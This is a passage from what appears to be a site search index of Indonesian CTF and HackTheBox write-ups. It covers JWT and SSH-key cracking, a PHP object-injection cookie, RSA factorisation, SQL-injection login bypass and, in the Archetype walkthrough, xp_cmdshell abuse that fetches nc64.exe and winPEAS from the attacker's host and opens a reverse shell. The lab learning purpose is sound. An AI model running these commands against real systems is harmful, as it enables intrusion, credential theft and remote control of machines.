GzMpmzBzJtL5/SzFCuN148sMUOASnXLSYd79dB15M0nVRo6Iz9mytF/QVuci+8h+ 6luGQBgih+L5ghx1qvUXwNyU+Id9fZYRA8pH2hy5pPWVsaws/1cLOc5PBzOaql7G 90iM4IyzSN2AO8/6HnSJ9tZSCG5cdRq+r1ROF30QnvnUowsbq0eeT4TVfb+kCaHx -----END RSA PRIVATE KEY-----","title":"Soal"},{"location":"ctf/writeup/comp/vishwa22_jtr/#solusi","text":"ssh2john idrsa.id_rsa.docx > id_rsa.hash john id_rsa.hash --wordlist=/path/to/rockyou.txt","title":"Solusi"},{"location":"ctf/writeup/comp/vishwa22_kys/","text":"Vishwa CTF 2022: Keep Your Secret \u00b6 Tools \u00b6 https://github.com/ticarpi/jwt_tool python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imthc2htaXI1NCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjQ3ODkwODM5fQ.3f-DyDHTGTGR3ENVQuUKxPV0hRoS2Ix0dSaFQqolqdQ pada kenyataannya key-nya adalah owasp , yang mana perlu percobaan pada tiap file wordlist https://jwt.io/ edit role nya","title":"Keep Your Secrets"},{"location":"ctf/writeup/comp/vishwa22_kys/#vishwa-ctf-2022-keep-your-secret","text":"","title":"Vishwa CTF 2022: Keep Your Secret"},{"location":"ctf/writeup/comp/vishwa22_kys/#tools","text":"https://github.com/ticarpi/jwt_tool python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imthc2htaXI1NCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjQ3ODkwODM5fQ.3f-DyDHTGTGR3ENVQuUKxPV0hRoS2Ix0dSaFQqolqdQ pada kenyataannya key-nya adalah owasp , yang mana perlu percobaan pada tiap file wordlist https://jwt.io/ edit role nya","title":"Tools"},{"location":"ctf/writeup/comp/vishwa22_tl/","text":"Vishwa CTF 2022: Todo List \u00b6 list : https://t0-d0-l1st.vishwactf.com/ kata kunci PHP Object injection Bacaan \u00b6 https://trevorsaudi.medium.com/cybertalents-weekend-ctf-gu55y-writeup-php-object-injection-dfe173d9f446 Vulnerable \u00b6 a:3:{i:0;s:5:\"hello\";i:1;s:5:\"there\";i:2;O:10:\"ShowSource\":1:{s:6:\"source\";s:8:\"flag.php\";}} cookies-> todos=8a7c8919d6144fbef005470cdf9c6c01c350abd0a%3A3%3A%7Bi%3A0%3Bs%3A5%3A%22hello%22%3Bi%3A1%3Bs%3A5%3A%22there%22%3Bi%3A2%3BO%3A10%3A%22ShowSource%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D","title":"Todo List"},{"location":"ctf/writeup/comp/vishwa22_tl/#vishwa-ctf-2022-todo-list","text":"list : https://t0-d0-l1st.vishwactf.com/ kata kunci PHP Object injection","title":"Vishwa CTF 2022: Todo List"},{"location":"ctf/writeup/comp/vishwa22_tl/#bacaan","text":"https://trevorsaudi.medium.com/cybertalents-weekend-ctf-gu55y-writeup-php-object-injection-dfe173d9f446","title":"Bacaan"},{"location":"ctf/writeup/comp/vishwa22_tl/#vulnerable","text":"a:3:{i:0;s:5:\"hello\";i:1;s:5:\"there\";i:2;O:10:\"ShowSource\":1:{s:6:\"source\";s:8:\"flag.php\";}} cookies-> todos=8a7c8919d6144fbef005470cdf9c6c01c350abd0a%3A3%3A%7Bi%3A0%3Bs%3A5%3A%22hello%22%3Bi%3A1%3Bs%3A5%3A%22there%22%3Bi%3A2%3BO%3A10%3A%22ShowSource%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D","title":"Vulnerable"},{"location":"ctf/writeup/comp/zero0pts22_af/","text":"zer0pts CTF 2022, Anti-Fermat \u00b6 original writeup : https://rand-tech.github.io/posts/ctf/2022/zer0pts-ctf-2022/#anti-fermat Soal \u00b6 diberikan 2 file output.txt task.py n = 0x1ffc7dc6b9667b0dcd00d6ae92fb34ed0f3d84285364c73fbf6a572c9081931be0b0610464152de7e0468ca7452c738611656f1f9217a944e64ca2b3a89d889ffc06e6503cfec3ccb491e9b6176ec468687bf4763c6591f89e750bf1e4f9d6855752c19de4289d1a7cea33b077bdcda3c84f6f3762dc9d96d2853f94cc688b3c9d8e67386a147524a2b23b1092f0be1aa286f2aa13aafba62604435acbaa79f4e53dea93ae8a22655287f4d2fa95269877991c57da6fdeeb3d46270cd69b6bfa537bfd14c926cf39b94d0f06228313d21ec6be2311f526e6515069dbb1b06fe3cf1f62c0962da2bc98fa4808c201e4efe7a252f9f823e710d6ad2fb974949751 c = 0x60160bfed79384048d0d46b807322e65c037fa90fac9fd08b512a3931b6dca2a745443a9b90de2fa47aaf8a250287e34563e6b1a6761dc0ccb99cb9d67ae1c9f49699651eafb71a74b097fc0def77cf287010f1e7bd614dccfb411cdccbb84c60830e515c05481769bd95e656d839337d430db66abcd3a869c6348616b78d06eb903f8abd121c851696bd4cb2a1a40a07eea17c4e33c6a1beafb79d881d595472ab6ce3c61d6d62c4ef6fa8903149435c844a3fab9286d212da72b2548f087e37105f4657d5a946afd12b1822ceb99c3b407bb40e21163c1466d116d67c16a2a3a79e5cc9d1f6a1054d6be6731e3cd19abbd9e9b23309f87bfe51a822410a62 from Crypto.Util.number import isPrime , getStrongPrime from gmpy import next_prime from secret import flag # Anti-Fermat Key Generation p = getStrongPrime ( 1024 ) q = next_prime ( p ^ (( 1 << 1024 ) - 1 )) n = p * q e = 65537 # Encryption m = int . from_bytes ( flag , 'big' ) assert m < n c = pow ( m , e , n ) print ( 'n = {} ' . format ( hex ( n ))) print ( 'c = {} ' . format ( hex ( c ))) Solusi \u00b6 bacaan : https://en.wikipedia.org/wiki/Fermat's_factorization_method rumus : \\(n = (\\frac{p+q}{2})^2 - (\\frac{p-q}{2})^2\\) setelah dilakukan percobaan pada soal, nilai \\(p - q^{(1<<1024)-1)} - 1\\) dan \\(p + q - (1<<1024)\\) adalah sama dan nilainya kecil \\(p+q \u2248 1 << 1024\\) dengan menggunakan Fermat\u2019s factorization method, diperoleh \\(p \u2248 \\frac{(1<<1024)+\\sqrt{(1<<1024)^2 - 4n}}{2}\\) lalu lakukan pengecekan next_prime sehingga diperoleh nilai \\(p\\) dan \\(q\\)","title":"zer0ptsCTF2022, Anti-Fermat"},{"location":"ctf/writeup/comp/zero0pts22_af/#zer0pts-ctf-2022-anti-fermat","text":"original writeup : https://rand-tech.github.io/posts/ctf/2022/zer0pts-ctf-2022/#anti-fermat","title":"zer0pts CTF 2022, Anti-Fermat"},{"location":"ctf/writeup/comp/zero0pts22_af/#soal","text":"diberikan 2 file output.txt task.py n = 0x1ffc7dc6b9667b0dcd00d6ae92fb34ed0f3d84285364c73fbf6a572c9081931be0b0610464152de7e0468ca7452c738611656f1f9217a944e64ca2b3a89d889ffc06e6503cfec3ccb491e9b6176ec468687bf4763c6591f89e750bf1e4f9d6855752c19de4289d1a7cea33b077bdcda3c84f6f3762dc9d96d2853f94cc688b3c9d8e67386a147524a2b23b1092f0be1aa286f2aa13aafba62604435acbaa79f4e53dea93ae8a22655287f4d2fa95269877991c57da6fdeeb3d46270cd69b6bfa537bfd14c926cf39b94d0f06228313d21ec6be2311f526e6515069dbb1b06fe3cf1f62c0962da2bc98fa4808c201e4efe7a252f9f823e710d6ad2fb974949751 c = 0x60160bfed79384048d0d46b807322e65c037fa90fac9fd08b512a3931b6dca2a745443a9b90de2fa47aaf8a250287e34563e6b1a6761dc0ccb99cb9d67ae1c9f49699651eafb71a74b097fc0def77cf287010f1e7bd614dccfb411cdccbb84c60830e515c05481769bd95e656d839337d430db66abcd3a869c6348616b78d06eb903f8abd121c851696bd4cb2a1a40a07eea17c4e33c6a1beafb79d881d595472ab6ce3c61d6d62c4ef6fa8903149435c844a3fab9286d212da72b2548f087e37105f4657d5a946afd12b1822ceb99c3b407bb40e21163c1466d116d67c16a2a3a79e5cc9d1f6a1054d6be6731e3cd19abbd9e9b23309f87bfe51a822410a62 from Crypto.Util.number import isPrime , getStrongPrime from gmpy import next_prime from secret import flag # Anti-Fermat Key Generation p = getStrongPrime ( 1024 ) q = next_prime ( p ^ (( 1 << 1024 ) - 1 )) n = p * q e = 65537 # Encryption m = int . from_bytes ( flag , 'big' ) assert m < n c = pow ( m , e , n ) print ( 'n = {} ' . format ( hex ( n ))) print ( 'c = {} ' . format ( hex ( c )))","title":"Soal"},{"location":"ctf/writeup/comp/zero0pts22_af/#solusi","text":"bacaan : https://en.wikipedia.org/wiki/Fermat's_factorization_method rumus : \\(n = (\\frac{p+q}{2})^2 - (\\frac{p-q}{2})^2\\) setelah dilakukan percobaan pada soal, nilai \\(p - q^{(1<<1024)-1)} - 1\\) dan \\(p + q - (1<<1024)\\) adalah sama dan nilainya kecil \\(p+q \u2248 1 << 1024\\) dengan menggunakan Fermat\u2019s factorization method, diperoleh \\(p \u2248 \\frac{(1<<1024)+\\sqrt{(1<<1024)^2 - 4n}}{2}\\) lalu lakukan pengecekan next_prime sehingga diperoleh nilai \\(p\\) dan \\(q\\)","title":"Solusi"},{"location":"ctf/writeup/htb/","text":"","title":"Hackthebox"},{"location":"ctf/writeup/htb/htb-appointment/","text":"Appointment \u00b6 Learn \u00b6 SQL Injection \u00b6 Di internet banyak Pract \u00b6 nmap -sV -sC 10 .129.106.116 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 12:46 WIB Nmap scan report for 10.129.106.116 Host is up (0.22s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Login Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.92 seconds username: admin'# password: asdasdads","title":"Appointment"},{"location":"ctf/writeup/htb/htb-appointment/#appointment","text":"","title":"Appointment"},{"location":"ctf/writeup/htb/htb-appointment/#learn","text":"","title":"Learn"},{"location":"ctf/writeup/htb/htb-appointment/#sql-injection","text":"Di internet banyak","title":"SQL Injection"},{"location":"ctf/writeup/htb/htb-appointment/#pract","text":"nmap -sV -sC 10 .129.106.116 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 12:46 WIB Nmap scan report for 10.129.106.116 Host is up (0.22s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Login Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.92 seconds username: admin'# password: asdasdads","title":"Pract"},{"location":"ctf/writeup/htb/htb-archetype/","text":"Archetype \u00b6 #smbclient #ms-sql-server #impacket nmap -sV -sC <ip_target> Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 15:37 WIB Nmap scan report for 10.129.106.221 Host is up (0.37s latency). Not shown: 994 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds 1078/tcp filtered avocent-proxy 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM | ms-sql-ntlm-info: | Target_Name: ARCHETYPE | NetBIOS_Domain_Name: ARCHETYPE | NetBIOS_Computer_Name: ARCHETYPE | DNS_Domain_Name: Archetype | DNS_Computer_Name: Archetype |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2022-01-24T01:47:56 |_Not valid after: 2052-01-24T01:47:56 |_ssl-date: 2022-01-24T01:50:29+00:00; -6h48m24s from scanner time. 10012/tcp filtered unknown Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-01-24T01:50:12 |_ start_date: N/A | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3) | Computer name: Archetype | NetBIOS computer name: ARCHETYPE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-01-23T17:50:14-08:00 | ms-sql-info: | 10.129.106.221:1433: | Version: | name: Microsoft SQL Server 2017 RTM | number: 14.00.1000.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_clock-skew: mean: -5h12m23s, deviation: 3h34m41s, median: -6h48m24s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 64.05 seconds Port SMB terbuka dan juga Microsoft SQL Server 2017. Enumerate SMB dengan smbclient smbclient -N -L \\\\\\\\<ip_target> -N : No password -L : This option allows you to look at what services are available on a server Akses yang dapat dienumerate backups smbclient -N \\\\\\\\<ip_target>\\\\backups smb: \\> dir smb: \\> get prod.dtsConfig cat prod.dtsConfig <DTSConfiguration> <DTSConfigurationHeading> <DTSConfigurationFileInfo GeneratedBy=\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/> </DTSConfigurationHeading> <Configuration ConfiguredType=\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\"> <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue> </Configuration> </DTSConfiguration> Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc Enumerate MS-SQL-Server Impacket tool includes a valueable python script called mssqlclient.py which offers such a functionality. Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library. https://github.com/SecureAuthCorp/impacket git clone https://github.com/SecureAuthCorp/impacket.git cd impacket pip3 install . # OR: sudo python3 setup.py install # In case you are missing some modules: pip3 install -r requirements.txt semua file yang akan digunakan diambil dari folder impacket python3 mssqlclient.py -h python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth SQL> help https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet cek role yang kita miliki di dalam server SQL> SELECT is_srvrolemember('sysadmin'); cek aktivasi xp_cmdshell , karena biasanya disable by default SQL> EXEC xp_cmdshell 'net user'; mengaktifkan xp_cmdshell EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; - Enabling the sp_configure as stated in the above error message EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; cek SQL> xp_cmdshell \"whoami\" Reverse Shell konsep 1. upload nc64.exe ke server 2. eksekusi cmd.exe di listener http server (local) -> server -> listener (local) nc64.exe buka terminal sudo python3 -m http.server 80 new terminal tab sudo nc -lvnp 443 akan menggunakan powershell karena fiturnya lebih banyak, sehingga powershell -c command tiap eksekusi SQL> xp_cmdshell \"powershell -c pwd\" flag user C:\\Users\\sql_svc\\Desktop menempatkan pada directory yang memungkinkan user biasa write SQL> xp_cmdshell \"powershell -c dir C:\\Users\" SQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://<ip_local>/nc64.exe -outfile nc64.exe\" *jangan lupa untuk allow port 80 pada local (linux ufw): sudo ufw allow 80 bind cmd.exe ke listener local SQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe <ip_local> 443\" Previlege Escalation Windows Previleges Escalation, tools winPeas kirim ke target mesin powershell wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe run PS C:\\Users\\sql_svc\\Downloads> .\\winPEASx64.exe buka listener cd C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ type ConsoleHost_history.txt diperoleh user dan password dari admin buka terminal baru python3 psexec.py administrator@{TARGET_IP} flag root C:\\Users\\Administrator\\Desktop","title":"Archetype"},{"location":"ctf/writeup/htb/htb-archetype/#archetype","text":"#smbclient #ms-sql-server #impacket nmap -sV -sC <ip_target> Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 15:37 WIB Nmap scan report for 10.129.106.221 Host is up (0.37s latency). Not shown: 994 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds 1078/tcp filtered avocent-proxy 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM | ms-sql-ntlm-info: | Target_Name: ARCHETYPE | NetBIOS_Domain_Name: ARCHETYPE | NetBIOS_Computer_Name: ARCHETYPE | DNS_Domain_Name: Archetype | DNS_Computer_Name: Archetype |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2022-01-24T01:47:56 |_Not valid after: 2052-01-24T01:47:56 |_ssl-date: 2022-01-24T01:50:29+00:00; -6h48m24s from scanner time. 10012/tcp filtered unknown Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-01-24T01:50:12 |_ start_date: N/A | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3) | Computer name: Archetype | NetBIOS computer name: ARCHETYPE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-01-23T17:50:14-08:00 | ms-sql-info: | 10.129.106.221:1433: | Version: | name: Microsoft SQL Server 2017 RTM | number: 14.00.1000.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_clock-skew: mean: -5h12m23s, deviation: 3h34m41s, median: -6h48m24s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 64.05 seconds Port SMB terbuka dan juga Microsoft SQL Server 2017. Enumerate SMB dengan smbclient smbclient -N -L \\\\\\\\<ip_target> -N : No password -L : This option allows you to look at what services are available on a server Akses yang dapat dienumerate backups smbclient -N \\\\\\\\<ip_target>\\\\backups smb: \\> dir smb: \\> get prod.dtsConfig cat prod.dtsConfig <DTSConfiguration> <DTSConfigurationHeading> <DTSConfigurationFileInfo GeneratedBy=\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/> </DTSConfigurationHeading> <Configuration ConfiguredType=\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\"> <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue> </Configuration> </DTSConfiguration> Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc Enumerate MS-SQL-Server Impacket tool includes a valueable python script called mssqlclient.py which offers such a functionality. Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library. https://github.com/SecureAuthCorp/impacket git clone https://github.com/SecureAuthCorp/impacket.git cd impacket pip3 install . # OR: sudo python3 setup.py install # In case you are missing some modules: pip3 install -r requirements.txt semua file yang akan digunakan diambil dari folder impacket python3 mssqlclient.py -h python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth SQL> help https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet cek role yang kita miliki di dalam server SQL> SELECT is_srvrolemember('sysadmin'); cek aktivasi xp_cmdshell , karena biasanya disable by default SQL> EXEC xp_cmdshell 'net user'; mengaktifkan xp_cmdshell EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; - Enabling the sp_configure as stated in the above error message EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; cek SQL> xp_cmdshell \"whoami\" Reverse Shell konsep 1. upload nc64.exe ke server 2. eksekusi cmd.exe di listener http server (local) -> server -> listener (local) nc64.exe buka terminal sudo python3 -m http.server 80 new terminal tab sudo nc -lvnp 443 akan menggunakan powershell karena fiturnya lebih banyak, sehingga powershell -c command tiap eksekusi SQL> xp_cmdshell \"powershell -c pwd\" flag user C:\\Users\\sql_svc\\Desktop menempatkan pada directory yang memungkinkan user biasa write SQL> xp_cmdshell \"powershell -c dir C:\\Users\" SQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://<ip_local>/nc64.exe -outfile nc64.exe\" *jangan lupa untuk allow port 80 pada local (linux ufw): sudo ufw allow 80 bind cmd.exe ke listener local SQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe <ip_local> 443\" Previlege Escalation Windows Previleges Escalation, tools winPeas kirim ke target mesin powershell wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe run PS C:\\Users\\sql_svc\\Downloads> .\\winPEASx64.exe buka listener cd C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ type ConsoleHost_history.txt diperoleh user dan password dari admin buka terminal baru python3 psexec.py administrator@{TARGET_IP} flag root C:\\Users\\Administrator\\Desktop","title":"Archetype"},{"location":"ctf/writeup/htb/htb-bat_computer/","text":"Bat Computer pwn Intro to Binary Exploitation htb-pwn Bat Computer.zip hackthebox $ file batcomputer batcomputer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22, for GNU/Linux 3.2.0, stripped $ checksec batcomputer ... Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Position Independent Executable (PIE) \u2014 a binary and all of its dependencies are loaded into random locations within virtual memory each time the application is executed Partial RELRO \u2014 some sections of the binary are read-only, preventing them from being modified Stack Canary \u2014 a value written on the stack which is later checked to ensure it has not been overwritten; used to detect buffer overflows Non-Executable Stack (NX) \u2014 a memory protection mechanism used to prevent shell code located within the stack from being executed __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { int v4 ; // [rsp+0h] [rbp-60h] int v5 ; // [rsp+4h] [rbp-5Ch] int v6 ; // [rsp+14h] [rbp-4Ch] sub_11A9 ( a1 , a2 , a3 ); while ( 1 ) { while ( 1 ) { memset ( & v5 , 0 , 0x10uLL ); printf ( \"Welcome to your BatComputer, Batman. What would you like to do? \\n 1. Track Joker \\n 2. Chase Joker \\n > \" ); __isoc99_scanf ( \"%d\" , & v4 ); if ( v4 != 1 ) break ; printf ( \"It was very hard, but Alfred managed to locate him: %p \\n \" , & v6 ); } if ( v4 != 2 ) break ; printf ( \"Ok. Let's do this. Enter the password: \" ); __isoc99_scanf ( \"%15s\" , & v5 ); if ( strcmp (( const char * ) & v5 , \"b4tp@$$w0rd!\" ) ) { puts ( \"The password is wrong. \\n I can't give you access to the BatMobile!\" ); exit ( 0 ); } printf ( \"Access Granted. \\n Enter the navigation commands: \" ); read ( 0 , & v6 , 0x89uLL ); puts ( \"Roger that!\" ); } puts ( \"Too bad, now who's gonna save Gotham? Alfred?\" ); return 0L L ; } gef\u27a4 run Starting program: {...} Welcome to your BatComputer, Batman. What would you like to do? 1. Track Joker 2. Chase Joker > ^C Program received signal SIGINT, Interrupt. 0x00007ffff7ec055e in __GI___libc_read (fd=0x0, buf=0x7ffff7fa0a23 <_IO_2_1_stdin_+131>, nbytes=0x1) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory. [ Legend: Modified register | Code | Heap | Stack | String ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500 $rax : 0xfffffffffffffe00 $rbx : 0x007ffff7fa09a0 \u2192 0x00000000fbad208b $rcx : 0x007ffff7ec055e \u2192 0x5a77fffff0003d48 (\"H=\"?) $rdx : 0x1 $rsp : 0x007fffffffd458 \u2192 0x007ffff7e52cdc \u2192 <_IO_file_underflow+396> test rax, rax $rbp : 0x007ffff7fa24a0 \u2192 0x0000000000000000 $rsi : 0x007ffff7fa0a23 \u2192 0xfa36800000000000 $rdi : 0x0 $rip : 0x007ffff7ec055e \u2192 0x5a77fffff0003d48 (\"H=\"?) $r8 : 0x0 $r9 : 0xffffffffffffff88 $r10 : 0x00555555556069 \u2192 0x4900000000006425 (\"%d\"?) $r11 : 0x246 $r12 : 0x007ffff7fa16c0 \u2192 0x00000000fbad2887 $r13 : 0xd68 $r14 : 0x007ffff7fa18a0 \u2192 0x0000000000000000 $r15 : 0x007ffff7fa2608 \u2192 0x007ffff7e54a70 \u2192 <_IO_cleanup+0> push r15 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500 0x007fffffffd458\u2502+0x0000: 0x007ffff7e52cdc \u2192 <_IO_file_underflow+396> test rax, rax \u2190 $rsp 0x007fffffffd460\u2502+0x0008: 0x0000000000000000 0x007fffffffd468\u2502+0x0010: 0x0000000000000000 0x007fffffffd470\u2502+0x0018: 0x0000000000000003 0x007fffffffd478\u2502+0x0020: 0x007ffff7fa09a0 \u2192 0x00000000fbad208b 0x007fffffffd480\u2502+0x0028: 0x007ffff7fa24a0 \u2192 0x0000000000000000 0x007fffffffd488\u2502+0x0030: 0x007ffff7fa14c0 \u2192 0x007ffff7f9d740 \u2192 0x007ffff7f6c209 \u2192 0x636d656d5f5f0043 (\"C\"?) 0x007fffffffd490\u2502+0x0038: 0x0000000000000000 